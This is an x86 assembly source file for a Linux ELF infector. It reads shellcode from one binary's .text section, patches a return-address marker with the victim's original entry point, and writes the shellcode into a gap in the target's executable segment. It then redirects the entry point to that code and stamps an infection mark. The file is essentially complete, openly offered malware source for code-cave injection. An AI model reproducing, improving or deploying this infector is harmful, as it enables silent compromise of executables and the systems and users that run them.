%include "include/shared.s"
			; optional TODO's lines: 106, 136, 258, 326
			; todo's lines : 433
; TODO : both files should be MAP_PRIVATE in mmap:
STRUC	stat
	before_size:	resb	20 	; the other elements don't really matter in this context, we just need
	st_size: 	resd	1	; the st_size's offset, and the size of the structure
	stat_padding:	resb 	64
ENDSTRUC

STRUC Elf32_Ehdr
	e_ident:	resb 	ident_size
	e_type:		resw 	1
	e_machine:	resw 	1
	e_version:	resd	1
	e_entry:	resd	1
	e_phoff:	resd	1
	e_shoff:	resd	1
	e_flags:	resd	1
	e_ehsize:	resw	1
	e_phentsize:	resw	1
	e_phnum:	resw	1
	e_shentsize:	resw	1
	e_shnum:	resw	1
	e_shstrndx:	resw	1
ENDSTRUC

STRUC Elf32_Shdr
	sh_name:	resd	1
	sh_type:	resd	1
	sh_flags:	resd	1
	sh_addr:	resd	1
	sh_offset:	resd	1
	sh_size:	resd	1
	sh_link:	resd	1
	sh_info:	resd	1
	sh_addralign:	resd	1
	sh_entsize:	resd	1
ENDSTRUC

STRUC Elf32_Phdr
	p_type:		resd	1
	p_offset:	resd	1
	p_vaddr:	resd	1
	p_paddr:	resd	1
	p_filesz:	resd	1
	p_memsz:	resd	1
	p_flags:	resd	1
	p_align:	resd	1
ENDSTRUC

section .bss
	pivot_name:	resd 	1	; pivot file's name
	pivot_fd:	resd 	1
	pivot_size:	resd 	1
	pivot_data:	resd 	1	; pointer to the mapped data

	elf_fd:		resd 	1
	elf_size:	resd 	1
	elf_data:	resd 	1	; pointer to mapped data

	shellcode:	resd 	1	; shellcode address is memorry
	shellcode_size:	resd 	1

section .text
	global _start

	_start:
	cmp dword[esp], 3 		; argc
	je good_arg_count

	push STDERR
	push usage
	push usage_len
	call print

	push ERR_BAD_USAGE		; the return value
	jmp exit

good_arg_count:
	;; saving one file name for later
	mov eax, [esp + 0x8]		; pivot name
	mov [pivot_name], eax

	mov eax, [esp + 0x0c]		; elf name

	;; opening files
	push eax			; elf name
	push O_RDONLY
	call open

	mov [elf_fd], eax
	test eax, eax
	js open_err

next_open:
	push dword[pivot_name]
	push O_RDWR
	call open

	mov [pivot_fd], eax
	test eax, eax
	jns getting_sizes

open_err:
	push STDERR
	push bad_open
	push bad_open_len
	call print			; "couldn't open file!" ; TODO: might make it "$FILE couldn't be opened"

	push ERR_BAD_OPEN		; the return value
	;; deciding which file to clean
	mov eax, [elf_fd]
	test eax, eax
	js exit				; no files have been opened
	jmp close_elf			; elf was opened but pivot wasn't

getting_sizes:
	push eax			; pivot_fd
	call get_file_size
	test eax, eax			; pivot_size < 0 ?
	jle file_size_err
	mov [pivot_size], eax

next_size:
	push dword[elf_fd]
	call get_file_size
	mov [elf_size], eax
	test eax, eax			; elf_size < 0 ?
	jg mapping

file_size_err:
	;; comparing both sizes against -1 (fstat failed) and 0 (empty file)
	mov eax, [elf_size]
	test eax, eax
	je an_empty_file
	js failed_fstat

	; TODO might move the print from get_file_size to failed stat and make it write "$file coudn't be stated"

	mov eax, [pivot_size]
	test eax, eax
	js failed_fstat

an_empty_file:
	push STDERR
	push empty_file
	push empty_file_len
	call print			; "empty file!"
	push ERR_EMPTY_FILE		; the return value
	jmp close_files			; cleaning resources

failed_fstat:
	push ERR_BAD_FSTAT		; the return value
	jmp close_files			; cleaning resources

mapping:
	push eax 			; elf_size
	push MAP_PRIVATE
	push dword[elf_fd]
	call mmap
	mov [elf_data], eax

	cmp eax, -1			; this can't be replaced with a test eax, eax
	; if we jumped to mmap_err we have to figure out if we mapped any of the files correctly so
	; we know if we should unmap them before exiting, for that I'll use ebx
	; pivot wasn't mapped -> ebx = 1
	; elf wasn't mapped -> ebx = 0
	jne next_map
	xor ebx, ebx
	jmp mmap_err

next_map:
	push dword[pivot_size]
	push MAP_SHARED
	push dword[pivot_fd]
	call mmap
	mov [pivot_data], eax

	cmp eax, -1			; this can't be replaced with test eax, eax
	jne after_mapping
	mov ebx, 1

mmap_err:
	push ERR_BAD_MMAP		; the return value
	; ebx has a hint of what file failed to map
	test ebx, ebx
	je close_files			; elf failed -> nothing was mapped -> close files and exit
	jmp unmap_elf			; pivot failed -> elf was mapped -> unmap elf, close files then exit

after_mapping:
	; next we have to check if both the target file and the payload are 32 bit little endian, if not we exit
	push dword[pivot_data]
	call is_target_elf		; returns -1 for false, 0 for true
	test eax, eax			; is this a good file ?
	jne arch_err

	push dword[elf_data]
	call is_target_elf
	test eax, eax			; is this a good file ?
	je checking_infection

arch_err:
	push ERR_NOT_TARGET		; the return value
	jmp clean

checking_infection:
	; in the end of each infection we leave a special mark @ EI_PAD offset, checking those bytes should
	; yeld if the file is already infected or not

	push mark
	mov eax, [pivot_data]
	add eax, EI_PAD
	push eax
	call strcmp

	test eax, eax
	jne extract_shellcode

	;; printing "$FILE_NAME is already infected"
	; printing the file name
	push STDERR
	mov eax, [pivot_name]
	push eax
	call strlen

	push eax
	call print

	; print the rest of the string
	push STDERR
	push infected
	push infected_len
	call print

	push ERR_INFECTED		; the return value
	jmp clean

extract_shellcode:

	push dword[elf_data]
	push shellcode_size
	call find_shell 		; returns a pointer to the .text sections, and initializes
					; the shellcode_size variable

	test eax, eax			; shellcode == NULL ?
	jne next
	push ERR_NO_SHELL		; the return
	jmp clean

next:
	mov [shellcode], eax

patching:
	push eax			; the shellcode address
	push dword[shellcode_size]
	push 0x69696969 		; the DOWRD to replace in the shellcode
 	; sending the shellcode entry point so we can replace that marker with it
	mov eax, [pivot_data]
	add eax, e_entry
	push dword[eax]

	call patch_jump_point
	test eax, eax			; was the marker found and replaced ?
	jns segments

	push ERR_NO_MARKER		; the return value
	jmp clean			; marker wasn't found -> we can't complete the infection

segments:
	;; parse the segment headers and find a gap in the executable one
	; getting a pointer to the segment base
	mov eax, [pivot_data]
	mov ebx, [eax + e_phoff] 	; we need eax to stay the same for a while ; TODO : optimize this line
	add ebx, eax
	sub ebx, Elf32_Phdr_size 	; pointer to the program headers's base - 1 * Elf32_Phdr_size

	; getting p_phunm
	mov cx, word[eax + e_phnum]
	movzx ecx, cx			; e_phnum is a word value

next_segment:

	dec ecx
	js no_segment

	add ebx, Elf32_Phdr_size	; ++segment

	mov edx, [ebx + p_type]		; checking the segment type
	and edx, PT_LOAD
	je next_segment 		; not a loadable segment

	mov edx, [ebx + p_flags] 	; checking the segment flags
	and edx, PF_X
	je next_segment			; not an executable segment

	jmp segment_found

no_segment:
	; this shouldn't really happen in normal executables that weren't manually edited
	push ERR_NO_XL_SEG		; the return value
	jmp clean

segment_found:
	; now that we found a target segment, we have to find a suitable gap to store our shellcode
	push dword[pivot_data]
	push ebx			; the target segment header
	push dword[shellcode_size]

	call find_gap
	test eax, eax			; gap == NULL ?
	jne next2
	push ERR_NO_GAP
	jmp clean

next2:
	; copying the shellcode
	push eax 			; the gap address
	push dword[shellcode]
	push dword[shellcode_size]
	call copy_data

	push STDOUT
	push shell_copied
	push shell_copied_len
	call print			; "copying shell .."


	; now that everything is validated all we have to do is :
	;	1 - patch the entry point
	; 	2 - leave mark
	; 	3 - unmap and close the files
	; 	4 - ???
	; 	5 - profit

	;; 1 - patchng the entry point
	; eax has the gap offset in memorry, we have to get the gap offset in file, then add it to the old 
	; entry point value
	; ebx should still have an Elf32_Phdr pointer to the target segment and
	mov edx, [ebx + p_vaddr]
	sub eax, [pivot_data]		; get the gap offset in file
	add eax, edx			; the the new entry point (e.g where the shell is goning to be in memory)
	mov ebx, [pivot_data]		; TODO : might use a lea here
	add ebx, e_entry
	mov [ebx], eax			; patching the entry point
	;;

leaving_mark:
	push STDOUT
	push marking
	push marking_len
	call print			;"leaving a mark ..."

	mov eax, [pivot_data]
	add eax, EI_PAD			; pointing at EI_PAD
	push eax
	push mark			; the "jeff was here" thingy
	call strlen
	push eax
	call copy_data

	;; printing "$FILE has been infected"

	push STDOUT
	mov eax, [pivot_name]
	push eax
	call strlen
	push eax
	call print

	push STDOUT
	push enjoy
	push enjoy_len
	call print			; "file has been infected"

	push SUCCESS			; the return value

clean: 	; we have to preserve the state of the stack after each call since the return value was the last thing
	; pushed on the stack
	unmap_files:
		unmap_elf:
			push dword[elf_data]
			push dword[elf_size]
			call unmap
			add esp, 8

		unmap_pivot:
			push dword[pivot_data]
			push dword[pivot_size]
			call unmap
			add esp, 8

	close_files:
		close_pivot:
			push dword[pivot_fd]
			call close
			add esp, 4

		close_elf:
			push dword[elf_fd]
			call close
			add esp, 4

	jmp exit



open:	; int open(char *file, int flags);
	push ebp
	mov ebp, esp

	;saving used registers
	push ebx
	push ecx
	;

	mov eax, 0x5			; sys_open
	mov ebx, [ebp + 0xc]		; file name
	mov ecx, [ebp + 0x8]		; flags
	int 0x80

	;restoring used registers
	pop ecx
	pop ebx
	;
	pop ebp
	ret



mmap:	; void *mmap(DWORD size, int flags, int fd);
	push ebp
	mov ebp, esp
	;; saving used resgisters
	push ebx
	push ecx
	push edx
	push esi
	push edi
	;;

	mov eax, 0xc0			; sys_mmap_pgoff
	xor ebx, ebx			; the kernal is free to map at any random address
	mov ecx, [ebp + 0x10]		; file size
	mov edx, PROT_READ_WRITE	; the whole goals is to be able to edit both files in memorry
	mov esi, [ebp + 0xc]		; flags
	mov edi, [ebp + 0x08]		; file descriptor
	push ebp
	xor ebp, ebp			; offset
	int 0x80
	pop ebp

	mov ebx, eax
	shr ebx, 24			; TODO : replace with the other shift instruction that shitfs the register around (probably rol)
	cmp bl, 0xff 			; this means mmap returned -1
	jne ret_mmap

mapping_error:
	mov eax, -1
	push STDERR
	push bad_mmap
	push bad_mmap_len
	call print
	add esp, 0xc

ret_mmap:
	;; restoring used registers
	pop edi
	pop esi
	pop edx
	pop ecx
	pop ebx
	;;
	pop ebp
	ret



copy_data:	; void *copy_data(void *dst, void *src, DWORD size) ; basically a memcpy()
	push ebp
	mov ebp, esp
	;saving used registers
	push esi
	push edi
	push ecx
	;

	mov edi, [ebp + 0x10]
	mov esi, [ebp + 0x0c]
	mov ecx, [ebp + 0x8]		; size

copying_loop:
	dec ecx
	js copied

	cmp ecx, 3
	jl slow_copy

	movsd
	sub ecx, 3
	jmp copying_loop

slow_copy:
	movsb
	dec ecx
	jns slow_copy

copied:
	pop ecx
	pop edi
	pop esi
	;

	pop ebp
	ret



find_gap:	; void *find_gap(void *data, void *segment_Phdr, DWORD shellcode_size)

	push ebp
	mov ebp, esp
	;saving used registers
	push ebx
	push ecx
	push edx

method1:	; checking between-segments gaps, this should work most of the time duo to in-file segments
		; alignement
	mov eax, [ebp + 0xc]		; our target segment header
	mov ebx, [eax + p_offset]
	add ebx, [eax + p_filesz] 	; we have a pointer to the end of the executable segment in file

	; now getting the offset of the next segment

	add eax, Elf32_Phdr_size	; segment_Phdr ++
	mov ecx, [eax + p_offset] 	; pointer to the start of the next segment in file

	sub ecx, ebx			; calculating the gap size
	cmp ecx, [ebp + 8]		; gap_size > shellcode_size ?
	jl method2			; the shellcode won't fit in the gap

	; gap = ebx = (segment_Phdr -> offset + segment_Phdr -> filesz)(ebx) + memorry base

	add ebx, [ebp + 0x10]		; gap offset in file + memorry base = pointer to the gap in memorry
	mov eax, ebx			; to return
	jmp found_gap


method2:	; checking the in-segment 0-blocks
	xor eax, eax			; the size of the current gap
	mov ebx, [ebp + 0xc]		; segment header file

	mov ebx, [ebx + p_offset]
	add ebx, [ebp + 0x10]		; segment data in memorry

	mov ecx, -1			; the loop counter

	mov edx, [ebp + 0x10]
	mov edx, [edx + p_filesz]	; segment size

parsing_data:
	inc ecx				; ++i
	cmp ecx, edx			; i > seg_size ?
	je no_gap

	cmp byte[ebx + ecx], 0		; segment[i] == 0 ? ; TODO : use lodsb and rsi instead
	jne check_and_reset
	inc eax				; ++ gap_size
	jmp parsing_data

check_and_reset:
	cmp eax, [ebp + 0x08]		; current_size => shellcode_size ?
	jl reset_counter
	; we have a valid gap @ segment + i - current_size
	sub ecx, eax			; i - current_size
	add ebx, ecx			; segment + i - current_size
	mov eax, ebx			; the value to return
	jmp found_gap			; this was ret_gap, in case replacing it causes some error

reset_counter:
	xor eax, eax 			; gap_size = 0
	jmp parsing_data

no_gap:
	push STDERR
	push no_gap_found
	push no_gap_found_len
	call print
	xor eax, eax	 		; gap = NULL
	add esp, 0xc
	jmp ret_gap

found_gap:
	push STDOUT
	push gap_found
	push gap_found_len
	call print
	add esp, 0xc

ret_gap:
	; eax has the right return value, we just have to return
	;restoring used registers
	pop edx
	pop ecx
	pop ebx
	;
	pop ebp
	ret



patch_jump_point:	; bool patch_jump_point(char *shellcode, size_t size, DWORD marker, DWORD entry_point)
	push ebp
	mov ebp, esp
	;storing used registers
	push ebx
	push ecx
	push edx
	;
	mov eax, [ebp + 0x14]	 	; shellcode
	mov ecx, [ebp + 0x10]		; size
	mov edx, [ebp + 0xc] 		; the marker which is 0x69696969 in this case
	; the combo eax + ecx points at the last byte in the shellcode ('\0') but we need it to point 
	; at the last DWORD
	; so -1 byte for '\0' and -3 to point at the last DWORD
	sub ecx, 4

marker_loop:	; will be searching backwards from the end as that's where the marker is likely to be
	cmp dword[eax + ecx], edx
	je found_marker

	dec ecx
	jns marker_loop 		; buff[0] is a valid DWORD as well

no_mark_found:
	push STDERR
	push no_marker
	push no_marker_len
	call print
	add esp, 0xc
	mov eax, -1			; return FALSE
	jmp ret_patch

found_marker:
	mov ebx, [ebp + 0x8]		; the original entry point
	mov [eax + ecx], ebx 		; patching the shellcode return address
	xor eax, eax 			; return TRUE

ret_patch:
	;restoring saved register
	pop edx
	pop ecx
	pop ebx
	pop ebp
	ret



find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a pointer to .text section, and stores the shellcode size
	push ebp
	mov ebp, esp

	;saving registers
	push ebx
	push ecx
	push edx
	push esi
	push edi

	mov ebx, [ebp + 0xc] 		; this will stay in ebx for the rest of the function so we don't keep accessing memorry

	;;taking care of the generic section pointer (@ ebp - 4)
	mov edi, [ebx + e_shoff]
	add edi, ebx			; for later
	;;


	;;putting a pointer to the string table section into edx
	mov ax, word[ebx + e_shstrndx]
	movzx eax, ax
	mov ecx, Elf32_Shdr_size
	mul cl				; eax now has the string table file offset in file, and edx has 
					; the sections base in memorry
	add eax, edi
	; now we have a pointer to the string table section, but we want the actuall offset of the section
	; in memorry
	mov edx, [eax + sh_offset]
	add edx, ebx			; from now on, edx will have the pointer to the string index table, 
					; we're gonna use this later


	; parsing the sections and returning the address of .text
	mov cx, [ebx + e_shnum]
	movzx ecx, cx

	push target_section		; the first argument argument to strcmp

parsing_loop:
	;get the sh_name and add it to edx (the string table section)
	mov esi, [edi + sh_name]
	add esi, edx
	push esi
	call strcmp
	add esp, 4			; so we don't have to keep track of the stack 
	;do some error checking
	test eax, eax
	je found_text_section
	;; section ++
	add edi, Elf32_Shdr_size

	dec ecx
	jne parsing_loop

no_text_section:
	xor eax, eax 			; text = NULL
	push STDERR
	push no_text
	push no_text_len
	call print
	add esp, 0x10
	jmp ret_text_section

found_text_section:;
	;storing the address of the section header
	mov eax, edi			; the section header pointer
	mov eax, [edi + sh_offset] 	; the actual section offset
	add eax, ebx			; ebx still contains the mmap memory base ; this eax will be returned to 
					; the previous function!
	;storing the size
	mov ebx, [ebp + 0x8]
	mov ecx, [edi + sh_size]
	mov [ebx], ecx
	;
	add esp, 0x4

ret_text_section:
	;restoring registers
	pop edi
	pop esi
	pop edx
	pop ecx
	pop ebx
	;
	pop ebp
	ret



unmap:	; void unmap(void *data, size_t size);
	push ebp
	mov ebp, esp
	;saving registers
	push eax
	push ebx
	push ecx
	;

	mov eax, 0x5b
	mov ebx, [ebp + 0xc]
	mov ecx, [ebp + 0x8]
	int 0x80

	;restoring registers
	pop ecx
	pop ebx
	pop eax
	;
	pop ebp
	ret



close: ; void close(int fd);
	push ebp
	mov ebp, esp

	;saving registers
	push eax
	push ebx
	;

	mov eax, 0x6
	mov ebx, [ebp + 0x8]
	int 0x80

	;restoring registers
	pop ebx
	pop eax
	;
	pop ebp
	ret



get_file_size:	; size_t get_file_size(int fd);
	push ebp
	mov ebp, esp
	; saving registers
	push ebx
	push ecx
	; reserving space for stat structure in the stack
	sub esp, stat_size

	mov eax, 0x6c			; sys_newfstat
	mov ebx, [ebp + 0x8]
	mov ecx, esp

	int 0x80

	mov eax, [ecx + st_size]
	add esp, stat_size		; remove the structure of the stack

	test eax, eax
	jns ret_size

	push STDERR
	push bad_stat
	push bad_stat_len
	call print			; "couldn't stat file!"
	mov eax, -1
	add esp, 0xc

ret_size:
	;restoring registers
	pop ecx
	pop ebx
	;
	pop ebp
	ret



print: ; void print(int fd, char *buf, size_t len);
	push ebp
	mov ebp, esp
	; saving used resgiters
	push eax
	push ebx
	push ecx
	push edx
	; performing the syscall
	mov eax, 4
	mov ebx, [ebp + 0x10]
	mov ecx, [ebp + 0xc]
	mov edx, [ebp + 0x8]
	int 0x80
	; restoring saved registers
	pop edx
	pop ecx
	pop ebx
	pop eax
	;
	mov esp, ebp
	pop ebp
	ret



strlen:; size_t strlen(char *buf);
	push ebp
	mov ebp, esp
	;saving registers
	push ecx
	push esi
	;
	mov ecx, -1
	mov esi, [ebp + 0x8]

strlen_loop:
	inc ecx
	lodsb
	test al, al
	jne strlen_loop

	mov eax, ecx			; the return value
	;restoring registers
	pop esi
	pop ecx
	;
	mov esp, ebp
	pop ebp
	ret



is_target_elf: 	; int is_target_elf(void *data);
	push ebp
	mov ebp, esp

	mov eax, [ebp + 0x8]		; mapped data
	; checking the magic bytes
	cmp dword[eax], 0x464c457f 	; '\x7f' + "ELF"
	je good_elf_ptr

	push STDERR
	push bad_elf
	push bad_elf_len
	call print

	mov eax, -1
	add esp, 0xc
	jmp ret_arch

good_elf_ptr:
	add eax, 4
	cmp byte[eax], ELFCLASS32
	je is_32_bit

	push STDERR
	push bad_32_bit_elf
	push bad_32_bit_elf_len
	call print			; "file is not 32 bit"

	add esp, 0xc
	mov eax, -1			; the return value
	jmp ret_arch

is_32_bit:
	inc eax
	cmp byte[eax], LITTLE
	jne bad_little_endian
	xor eax, eax			; the return value
	jmp ret_arch

bad_little_endian:
	push STDERR
	push bad_l_endian
	push bad_l_endian_len
	call print
	add esp, 0xc
	mov eax, -1			; the return value

ret_arch:
	pop ebp
	ret



strcmp: ; size_t strcmp(char *known_buff, char *unkown_buff)
	push ebp
	mov ebp, esp
	; saving used registers;
	push ebx
	push ecx
	push edx
	; first we get the length of the first arg
	push dword[ebp + 0xc]
	call strlen
	mov ecx, eax
	mov eax, [ebp + 0x0c]
	mov ebx, [ebp + 0x8]
	dec ecx				; an array index

cmp_loop:
	; edx will be used to hold the actual bytes
	mov dl, byte[eax + ecx]
	mov dh, byte[ebx + ecx]
	xor dh, dl
	jne diff_buffers

	dec ecx  ; dec does take care of the flags
	jns cmp_loop
	jmp same_buffers

diff_buffers:
	mov eax, -1			; returns FALSE
	jmp end

same_buffers:
	xor eax, eax

end:
	;restoring registers
	add esp, 4
	pop edx
	pop ecx
	pop ebx

	pop ebp
	ret



exit:	;void exit(int return_stat)
	xor eax, eax
	pop ebx
	inc eax
	int 0x80
